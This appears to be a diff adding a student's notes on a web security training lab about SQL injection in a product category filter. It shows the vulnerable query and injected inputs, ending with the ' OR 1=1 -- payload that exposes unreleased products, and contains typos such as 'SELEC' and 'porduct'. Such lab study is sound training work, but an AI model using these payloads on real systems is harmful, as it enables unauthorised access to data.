@@ -1,0 +1,16 @@
+# Lab 1
+SQL injection - product category filter
+
+SELEC * FROM porduct WHERE category = 'Gifts' AND released = 1
+
+End gold: display all category both released and unreleased.
+
+Analysis:
+
+SELEC * FROM porduct WHERE category = 'Gifts' AND released = 1
+
+SELEC * FROM porduct WHERE category = ''' AND released = 1
+
+SELEC * FROM porduct WHERE category = ''--' AND released = 1
+
+SELEC * FROM porduct WHERE category = '' OR 1=1 --' AND released = 1
